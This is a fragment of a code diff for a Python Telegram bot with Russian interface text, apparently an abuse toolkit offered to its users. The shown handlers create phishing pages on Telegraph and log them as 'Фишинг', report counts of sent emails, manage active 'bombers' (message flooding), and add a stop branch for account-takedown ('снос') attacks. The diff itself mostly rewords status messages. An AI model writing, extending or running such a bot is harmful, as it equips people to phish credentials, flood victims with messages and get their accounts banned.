-        f"Отправлено: <b>{sent}</b> писем",
-        get_main_menu()
     )
 
 @dp.callback_query(F.data == "phish_create")
@@ -1437,7 +1402,7 @@ async def phish_button(msg: types.Message, state: FSMContext):
     await state.clear()
     await msg.delete()
     
-    st = await send_message_with_banner(msg, "<b>Создание...</b>")
+    st = await send_message_with_banner(msg, "<b>Создание ссылки...</b>")
     
     page_id = hashlib.md5(f"{user_id}_{time.time()}".encode()).hexdigest()[:8]
     url = await create_telegraph_page_fast(title, description, button_text, user_id, page_id)
@@ -1448,7 +1413,7 @@ async def phish_button(msg: types.Message, state: FSMContext):
         add_log(user_id, "Фишинг", url)
         await send_message_with_banner(msg, f"<b>ССЫЛКА СОЗДАНА!</b>\n\n<code>{url}</code>", get_main_menu())
     else:
-        await send_message_with_banner(msg, "<b>ОШИБКА</b>", get_main_menu())
+        await send_message_with_banner(msg, "<b>ОШИБКА СОЗДАНИЯ</b>", get_main_menu())
 
 @dp.callback_query(F.data == "phish_list")
 async def phish_list(cb: types.CallbackQuery):
@@ -1486,7 +1451,12 @@ async def stop(cb: types.CallbackQuery):
         del active_bombers[user_id]
         stopped = True
     
-    await edit_message_with_banner(cb, "<b>ОСТАНОВЛЕНО</b>" if stopped else "<b>НЕТ АКТИВНЫХ</b>", get_main_menu())
+    if user_id in active_snos_account:
+        active_snos_account[user_id]["stop_event"].set()
+        del active_snos_account[user_id]
+        stopped = True
+    
+    await edit_message_with_banner(cb, "<b>ОСТАНОВЛЕНО</b>" if stopped else "<b>НЕТ АКТИВНЫХ АТАК</b>", get_main_menu())
 
 @dp.message(F.photo)
 async def handle_photo(msg: types.Message):
